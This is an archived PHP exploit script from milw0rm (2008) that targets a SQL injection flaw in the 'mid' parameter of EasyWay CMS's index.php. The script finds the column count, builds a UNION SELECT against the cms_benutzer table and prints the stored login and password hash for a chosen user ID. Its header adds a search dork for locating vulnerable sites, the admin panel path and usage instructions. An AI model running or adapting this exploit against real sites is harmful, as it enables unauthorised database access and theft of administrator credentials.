<html><head><title>EasyWay CMS (index.php mid) Remote SQL Injection Exploit</title></head><pre>&lt;?php
ini_set(&quot;max_execution_time&quot;,0);
print_r('
###############################################################
#
#           EasyWay CMS - SQL Injection Exploit     
#                                                             
#      Vulnerability discovered by: Lidloses_Auge             
#      Exploit coded by:            Lidloses_Auge
#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco,
#                                   GPM, Free-Hack
#      Date:                        30.05.2008
#      Developer:		    http://www.ta-edv.de/index.php?lg=de&amp;css=1&amp;mid=320&amp;art=1
#
###############################################################
#                                                             
#      Dork:  inurl:&quot;index.php?css=mid=art=&quot;
#      Admin Panel: [Target]/cms/
#      Usage: php '.$argv[0].' [Target] [Userid]
#      Example for &quot;http://www.site.com/index.php?css=1&amp;mid=100&amp;art=1&quot;
#      =&gt; php '.$argv[0].' http://www.site.com 1
#                                                             
###############################################################
');
if ($argc == 3) {
echo &quot;\nExploiting in progress:&quot;;
$url = $argv[1];
$source = file_get_contents($url.'/index.php?mid=null+order+by+100/*');
$errorcount = substr_count($source,'not a valid MySQL');
$sql = '/index.php?mid=null+union+select+';
for ($i = 25; $i&gt;=1; $i--) {
   $source = file_get_contents($url.'/index.php?mid=null+order+by+'.$i.'/*');
   if (substr_count($source,'not a valid MySQL')!=$errorcount) {
      $errorcount2 = $i;
      $i = 1;
   }
}
for ($j=1; $j&lt;$errorcount2; $j++) {
   $sql = $sql.'concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a),';   
}
$sql = $sql.'concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a)+from+cms_benutzer+where+id='.$argv[2].'/*';
$source = file_get_contents($url.$sql);
echo &quot;\n&quot;;
if (strpos($source,'::::')!=0) {
   echo 'User: '.substr($source,strpos($source,'::::')+5,strpos($source,'::1::')-strpos($source,'::::')-5).&quot;\n&quot;;
   echo 'Hash: '.substr($source,strpos($source,'::1::')+5,strpos($source,'::2::')-strpos($source,'::1::')-5).&quot;\n&quot;;
} else {
   echo 'Exploit failed!'.&quot;\n&quot;;
}
} else {
echo &quot;\nNot enough arguments!\n&quot;;
}
?&gt;

# milw0rm.com [2008-05-31]</pre></html>